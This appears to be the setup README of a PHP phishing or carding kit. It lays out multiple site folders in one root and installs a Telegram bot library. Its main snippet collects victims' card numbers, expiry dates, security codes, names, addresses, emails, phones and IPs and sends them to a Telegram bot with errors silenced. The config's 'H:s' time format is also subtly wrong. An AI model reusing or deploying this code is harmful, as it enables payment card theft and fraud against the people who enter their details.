"# source_code_manage" 



Root Directory 
	admin
	dashboard


	#FOLDER_ANEM_OF_PROJECT
	#FOLDER_TWO_OF_PROJECT



	config.php
	index.php
	.htaccess


in root directory you create folder for new source code 

//Varifiable can access anywhere in code for current folder path

<?php echo $folder_path;?>
require $_SERVER["DOCUMENT_ROOT"].'/config.php';




//Config.php

define('DATE_TIME_FORMATE', "m/d/Y H:s"); 
define('DATE_FORMATE', "m/d/Y"); 
define('TIME_FORMATE', "H:s"); 
$globalDate = date(DATE_FORMATE);


<?php echo $globalDate; ?>
<?php echo date(DATE_TIME_FORMATE);?>
<?php echo date(DATE_TIME_FORMATE, strtotime($globalDate . ' -1 DAY +2 HOURS'));?>








Run this command in root directory for send notification to bot
composer require longman/telegram-bot




Send notification to telegram 
include ABS_PATH.'/notification_send_to_bot.php';
$message_data = array(
               'address'=> $address, 
               'city'=> $city, 
               'state'=> "", 
               'zipcode'=> $zipcode, 
               'email'=> $email, 
               'card_number'=> $cardnumber, 
               'card_expire'=> $exp_date, 
               'security_code'=> $card_code, 
               'card_holder'=> $fullname, 
               'ip'=> $ip, 
               'user_agent'=> $_SERVER['HTTP_USER_AGENT'], 
               'date_time'=> $date,
               'post_from'=> $folder_path,
               'phone'=> $phone
        );
@notification_to_bot($message_data,$conn);





//composer update
composer require longman/telegram-bot
add config.php
add dashboard/config.php
add dashboard/constant.php
add dashboard/authtoken.txt






